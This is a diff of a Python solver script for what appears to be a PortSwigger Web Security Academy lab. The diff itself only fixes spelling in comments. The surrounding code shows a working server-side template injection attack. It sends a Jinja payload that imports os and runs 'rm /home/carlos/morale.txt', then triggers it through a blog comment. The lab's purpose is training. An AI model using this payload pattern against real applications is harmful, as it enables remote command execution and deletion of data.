@@ -31,7 +31,7 @@ r2 = s.post(uri, data=data)
 soup = BeautifulSoup(r2.text, 'lxml')
 token = soup.find('input', {'name': 'csrf'})['value'] #account csrf token
 
-# Now send the malicous SSTI request in the vulnerable "blog-post-author-display" param at the "change-blog-post-author-display" endpoint from "my-account"
+# Now send the malicious SSTI request in the vulnerable "blog-post-author-display" param at the "change-blog-post-author-display" endpoint from "my-account"
 uri = f"https://{lab_id}.web-security-academy.net/my-account/change-blog-post-author-display"
 data = { 'blog-post-author-display' : "user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}",
         'csrf' : token
@@ -44,7 +44,7 @@ r4 = s.get(uri)
 soup = BeautifulSoup(r4.text, 'lxml')
 token = soup.find('input', {'name': 'csrf'})['value'] #blog page csrf token
 
-# Make a new post in order to display/trigger our malicous SSTI code from eariler
+# Make a new post in order to display/trigger our malicious SSTI code from earlier
 uri = f"https://{lab_id}.web-security-academy.net/post/comment"
 data = { 'csrf' : token,
         'postId' : 1,
